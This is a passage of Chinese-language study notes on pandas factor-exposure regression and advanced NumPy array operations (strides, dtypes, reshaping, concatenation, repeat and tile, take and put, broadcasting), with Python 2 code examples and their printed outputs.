<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy.random <span class="keyword">import</span> rand</span><br><span class="line">fac1, fac2, fac3 = np.random.rand(<span class="number">3</span>, <span class="number">1000</span>)</span><br><span class="line">ticker_subset = tickers.take(np.random.permutation(N)[:<span class="number">1000</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#因子加权和以及噪声</span></span><br><span class="line">port = pd.Series(<span class="number">0.7</span> * fac1 - <span class="number">1.2</span> * fac2 + <span class="number">0.3</span> * fac3 + rand(<span class="number">1000</span>),</span><br><span class="line">                 index = ticker_subset)</span><br><span class="line">factors = pd.DataFrame(&#123;<span class="string">'f1'</span>: fac1, <span class="string">'f2'</span>: fac2, <span class="string">'f3'</span>: fac3&#125;,</span><br><span class="line">                       index = ticker_subset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#各因子与投资组合之间的矢量相关性</span></span><br><span class="line"><span class="keyword">print</span> factors.corrwith(port)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算因子暴露的标准方法是最小二乘回归， 使用pandas.ols(将factors作为解释变量)</span></span><br><span class="line"><span class="comment">#j计算出整个投资组合的暴露</span></span><br><span class="line"><span class="keyword">print</span> pd.ols(y = port, x = factors).beta</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为没有给投资组合添加过多的随机噪声，所以原始的因子权重基本可以恢复，还可以通过groupby计算各行业的暴露量</span></span><br><span class="line"><span class="comment">#为了达到这个目的，先编写一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_exposure</span><span class="params">(chunk， factors = None)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> pd.ols(y = chunk, x = factors).beta</span><br><span class="line"><span class="comment">#根据行业进行分组，并应用该函数，传入因子载荷的dataFrame</span></span><br><span class="line">by_ind = port.groupby(industries)</span><br><span class="line">exposures = by_ind.apply(beta_exposure, factors = factors)</span><br><span class="line"><span class="keyword">print</span> exposures.unstack()</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="十分位和四分位分析"><a href="#十分位和四分位分析" class="headerlink" title="十分位和四分位分析"></a>十分位和四分位分析</h3><h1 id="Chapter-12-NUMPY高级应用"><a href="#Chapter-12-NUMPY高级应用" class="headerlink" title="Chapter 12: NUMPY高级应用"></a>Chapter 12: NUMPY高级应用</h1><h2 id="ndarray对象的内部机理"><a href="#ndarray对象的内部机理" class="headerlink" title="ndarray对象的内部机理"></a>ndarray对象的内部机理</h2><h3 id="ndarray内部由以下内容组成"><a href="#ndarray内部由以下内容组成" class="headerlink" title="ndarray内部由以下内容组成"></a>ndarray内部由以下内容组成</h3><ul>
<li>一个指向数组(一个系统内存块)的指针</li>
<li>数据类型或dtype</li>
<li>一个表示数组形状(shanpe)的元组就是shape属性</li>
<li><p>一个跨度元组(stride),其中的整数指的是为了前进到当前维度下一个元素需要”跨过”的字节数</p>
<ul>
<li>列如一个典型的(C顺序)3 X 4 X<br>5的float64(8个字节)数组，其跨度为(160, 40, 8)</li>
<li><p>其中8为 8字节， 40为 8 * 5， 160为 8 * 5 * 4</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> np.ones((<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>),dtype = np.float64).strides</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(160L, 40L, 8L)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="Numpy数据类型体系"><a href="#Numpy数据类型体系" class="headerlink" title="Numpy数据类型体系"></a>Numpy数据类型体系</h3><ol>
<li><p>检查数组中所包含的是否是整数、浮点数、字符串或python对象</p>
</li>
<li><p>dtype有一个超类(np.integer<br>np.floating)他们可以跟np.issubdtype函数结合使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ints = np.ones(<span class="number">10</span>, dtype = np.uint16)</span><br><span class="line">floats = np.ones(<span class="number">10</span>, dtype = np.float32)</span><br><span class="line"><span class="keyword">print</span> np.issubdtype(ints.dtype, np.integer)</span><br><span class="line"><span class="keyword">print</span> np.issubdtype(floats.dtype, np.floating)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">: True</span><br><span class="line">: True</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="高级数组操作"><a href="#高级数组操作" class="headerlink" title="高级数组操作"></a>高级数组操作</h3><ol>
<li><p>数组重塑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr.reshape(<span class="number">4</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多重数组也能被重塑</span></span><br><span class="line"><span class="keyword">print</span> arr.reshape(<span class="number">4</span>,<span class="number">2</span>).reshape(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#作为参数的形状的其中一维可以使-1，它代表该维度的大小由数据本身推断而来</span></span><br><span class="line">arr = np.arange(<span class="number">15</span>)</span><br><span class="line"><span class="keyword">print</span> arr.reshape(<span class="number">5</span>,<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#由于数组的shape属性是一个元组，因此它也可以传入reshape</span></span><br><span class="line">other_arr = np.ones((<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line"><span class="keyword">print</span> other_arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> arr.reshape(other_arr.shape)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#与reshape将一维数组转换为多维数组的运算相反的运算称为扁平化(flattening)或散开(raveling)</span></span><br><span class="line">arr = np.arange(<span class="number">15</span>).reshape(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr.ravel()  <span class="comment">#ravel不会产生元数据的副本</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr.flatten() <span class="comment">#flatten的行为类似于ravel，但是它总是返回数据的副本</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[0 1 2 3 4 5 6 7]</span><br><span class="line"></span><br><span class="line">[[0 1]</span><br><span class="line"> [2 3]</span><br><span class="line"> [4 5]</span><br><span class="line"> [6 7]]</span><br><span class="line"></span><br><span class="line">[[0 1 2 3]</span><br><span class="line"> [4 5 6 7]]</span><br><span class="line"></span><br><span class="line">[[ 0  1  2]</span><br><span class="line"> [ 3  4  5]</span><br><span class="line"> [ 6  7  8]</span><br><span class="line"> [ 9 10 11]</span><br><span class="line"> [12 13 14]]</span><br><span class="line"></span><br><span class="line">[[ 1.  1.  1.  1.  1.]</span><br><span class="line"> [ 1.  1.  1.  1.  1.]</span><br><span class="line"> [ 1.  1.  1.  1.  1.]]</span><br><span class="line"></span><br><span class="line">[[ 0  1  2  3  4]</span><br><span class="line"> [ 5  6  7  8  9]</span><br><span class="line"> [10 11 12 13 14]]</span><br><span class="line"></span><br><span class="line">[[ 0  1  2]</span><br><span class="line"> [ 3  4  5]</span><br><span class="line"> [ 6  7  8]</span><br><span class="line"> [ 9 10 11]</span><br><span class="line"> [12 13 14]]</span><br><span class="line"></span><br><span class="line">[ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14]</span><br><span class="line"></span><br><span class="line">[ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14]</span><br></pre></td></tr></table></figure>
</li>
<li><p>C和Fortran顺序</p>
<ol>
<li><p>行和列优先顺序分别称为C和Fortran顺序</p>
</li>
<li><p>reshape和reval这样的函数，都可以接受一个表示数组数据存放顺序的order参数</p>
<ol>
<li><p>一般可以使 “C” “F”等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">12</span>).rshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span> arr.ravel()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr.ravel(<span class="string">'F'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>二维或更高维数的重塑过程比较难，C和Fortran顺序的关键区别就是维度的行进顺序</p>
<ul>
<li>C/行优先顺序：先经过更高的维度（列如，轴1会先于轴0被处理）</li>
<li>Fortran/列优先顺序：<br>后经过更高对的维度(列如，轴0会优先轴1被处理)</li>
</ul>
</li>
</ol>
</li>
<li><p>数组的合并和拆分</p>
<ol>
<li><p>numpy.concatenate可以按指定轴将一个数组组成的序列连接到一起</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">arr2 = np.array([[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line"><span class="keyword">print</span> np.concatenate([arr1, arr2], axis = <span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.concatenate([arr1, arr2], axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于常见的连接操作，NumPy提供了一些比较方便的方法(vstack hstack)</span></span><br><span class="line"><span class="keyword">print</span> np.vstack((arr1, arr2))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.hstack((arr1, arr2))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#split则将一个数组沿着指定轴拆分为多个数组</span></span><br><span class="line"><span class="keyword">from</span> numpy.random <span class="keyword">import</span> randn</span><br><span class="line">arr = randn(<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line">first, second, third = np.split(arr, [<span class="number">1</span>,<span class="number">3</span>])</span><br><span class="line"><span class="keyword">print</span> first</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> second</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> third</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[[ 1  2  3]</span><br><span class="line"> [ 4  5  6]</span><br><span class="line"> [ 7  8  9]</span><br><span class="line"> [10 11 12]]</span><br><span class="line"></span><br><span class="line">[[ 1  2  3  7  8  9]</span><br><span class="line"> [ 4  5  6 10 11 12]]</span><br><span class="line"></span><br><span class="line">[[ 1  2  3]</span><br><span class="line"> [ 4  5  6]</span><br><span class="line"> [ 7  8  9]</span><br><span class="line"> [10 11 12]]</span><br><span class="line"></span><br><span class="line">[[ 1  2  3  7  8  9]</span><br><span class="line"> [ 4  5  6 10 11 12]]</span><br><span class="line"></span><br><span class="line">[[-0.23461861  1.40157661]</span><br><span class="line"> [-0.7095222   1.58978999]</span><br><span class="line"> [ 0.79123076 -0.21607249]</span><br><span class="line"> [-0.37967201  0.66574423]</span><br><span class="line"> [ 1.188882    0.36979158]]</span><br><span class="line">[[-0.23461861  1.40157661]]</span><br><span class="line"></span><br><span class="line">[[-0.7095222   1.58978999]</span><br><span class="line"> [ 0.79123076 -0.21607249]]</span><br><span class="line"></span><br><span class="line">[[-0.37967201  0.66574423]</span><br><span class="line"> [ 1.188882    0.36979158]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组 连接函数</p>
<p>|      函数                |      说明                                           |<br>|———————————|————————————————————————-|<br>| concatenate          | 最一般化的连接，沿一条轴连接一组数组            |<br>| vstack, row~stack~   | 以面向行的方式对数组进行堆叠(沿轴0)             |<br>| hstack               | 以面向列的方式对数组进行堆叠(沿轴1)             |<br>| column~stak~         | 类似于hstack,但是会先将一维数组转化成二维列向量 |<br>| dstack               | 以面向”深度”的方式对数据进行堆叠(沿轴2)         |<br>| split                | 沿指定轴在指定的位置拆分数组                    |<br>| hsplit vsplit dsplit | split的便捷函数，分别沿轴0,1,2进行拆分          |</p>
</li>
<li><p>堆叠辅助类r~和c~_</p>
<ol>
<li><p>NumPy命名空间中有两个特殊的对象 r~和~<br>c_,他们可以使数组的堆叠操作更为简洁</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">6</span>)</span><br><span class="line">arr1 = arr.reshape((<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line">arr2 = randn(<span class="number">3</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> np.r_[arr1, arr2]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.c_[np.r_[arr1, arr2], arr]</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[[ 0.          1.        ]</span><br><span class="line"> [ 2.          3.        ]</span><br><span class="line"> [ 4.          5.        ]</span><br><span class="line"> [-1.28377882  0.02789502]</span><br><span class="line"> [-0.3805641   2.72583374]</span><br><span class="line"> [ 0.53381564 -1.28980722]]</span><br><span class="line"></span><br><span class="line">[[ 0.          1.          0.        ]</span><br><span class="line"> [ 2.          3.          1.        ]</span><br><span class="line"> [ 4.          5.          2.        ]</span><br><span class="line"> [-1.28377882  0.02789502  3.        ]</span><br><span class="line"> [-0.3805641   2.72583374  4.        ]</span><br><span class="line"> [ 0.53381564 -1.28980722  5.        ]]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>元素的重复操作： tile和repeat</p>
<ol>
<li><p>repeat会将数组中的各个元素重复一定次数，从而产生一个更大的数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> arr.repeat(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#默认传入一个整数，则是各元素重复的次数，如果传入一组整数，则表示各元素可以重复的不同次数</span></span><br><span class="line"><span class="keyword">print</span> arr.repeat([<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">arr = randn(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> arr.repeat(<span class="number">2</span>, axis = <span class="number">0</span>) <span class="comment">#注意，如果没有设置轴向，则数组会扁平化</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#在多维进行重复时，可以传入整数，对各切片重复不同次数</span></span><br><span class="line"><span class="keyword">print</span> arr.repeat([<span class="number">2</span>,<span class="number">3</span>], axis = <span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr.repeat([<span class="number">2</span>,<span class="number">3</span>], axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tile的功能是沿特定轴向堆叠数组的副本，可以想象成"铺瓷砖"</span></span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.tile(arr, <span class="number">2</span>) <span class="comment">#第二个参数是数量，对于标量，瓷砖是水平铺设的，而不是垂直</span></span><br><span class="line"><span class="comment">#它可以是一个表示"铺设"布局的元组</span></span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.tile(arr, (<span class="number">2</span>,<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.tile(arr, (<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[0 0 0 1 1 1 2 2 2]</span><br><span class="line"></span><br><span class="line">[0 0 1 1 1 2 2 2 2]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814]</span><br><span class="line"> [-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]</span><br><span class="line"> [-2.41454401 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814]</span><br><span class="line"> [-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]</span><br><span class="line"> [-2.41454401 -1.80084267]</span><br><span class="line"> [-2.41454401 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -1.37933387 -0.06097814 -0.06097814 -0.06097814]</span><br><span class="line"> [-2.41454401 -2.41454401 -1.80084267 -1.80084267 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814 -1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267 -2.41454401 -1.80084267]]</span><br><span class="line">[[-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]</span><br><span class="line"> [-1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267]]</span><br><span class="line"></span><br><span class="line">[[-1.37933387 -0.06097814 -1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267 -2.41454401 -1.80084267]</span><br><span class="line"> [-1.37933387 -0.06097814 -1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267 -2.41454401 -1.80084267]</span><br><span class="line"> [-1.37933387 -0.06097814 -1.37933387 -0.06097814]</span><br><span class="line"> [-2.41454401 -1.80084267 -2.41454401 -1.80084267]]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>花式索引的等价函数： take和put</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">10</span>) * <span class="number">100</span></span><br><span class="line">inds = [<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">print</span> arr[inds]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ndarray有两个方法专门用于获取和设置单个轴向的选区</span></span><br><span class="line"><span class="keyword">print</span> arr.take(inds)</span><br><span class="line"></span><br><span class="line">arr.put(inds, <span class="number">42</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">arr.put(inds, [<span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>])</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要在其他轴上使用take,只需传入axis关键字即可</span></span><br><span class="line">inds = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">arr = randn(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr.take(inds, axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[700 100 200 600]</span><br><span class="line"></span><br><span class="line">[700 100 200 600]</span><br><span class="line">[  0  42  42 300 400 500  42  42 800 900]</span><br><span class="line"></span><br><span class="line">[  0  41  42 300 400 500  43  40 800 900]</span><br><span class="line"></span><br><span class="line">[[-0.03295171 -0.33494885  0.15989473 -0.7112217 ]</span><br><span class="line"> [-0.09916891  0.05100988  0.22046994 -0.28954971]]</span><br><span class="line"></span><br><span class="line">[[ 0.15989473 -0.03295171  0.15989473 -0.33494885]</span><br><span class="line"> [ 0.22046994 -0.09916891  0.22046994  0.05100988]]</span><br></pre></td></tr></table></figure>
<ol>
<li>put不接受axis参数，它只会在数据的扁平化版本(一维，<br>C顺序)上进行索引(可能会改善)</li>
</ol>
</li>
</ol>
<h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><h3 id="广播-broadcasting-是不同形状的数组之间的运算的执行方式"><a href="#广播-broadcasting-是不同形状的数组之间的运算的执行方式" class="headerlink" title="广播(broadcasting)是不同形状的数组之间的运算的执行方式"></a>广播(broadcasting)是不同形状的数组之间的运算的执行方式</h3><h3 id="将标量和数组合并时，就会发生最简单的广播"><a href="#将标量和数组合并时，就会发生最简单的广播" class="headerlink" title="将标量和数组合并时，就会发生最简单的广播"></a>将标量和数组合并时，就会发生最简单的广播</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> arr * <span class="number">4</span> <span class="comment">#标量4被广播到了其他所有的元素上</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#减去列平均值的方式对数组的每一列进行距平化处理</span></span><br><span class="line">arr = randn(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> arr.mean(<span class="number">0</span>)</span><br><span class="line">demeaned = arr - arr.mean(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> demeaned</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> demeaned.mean(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
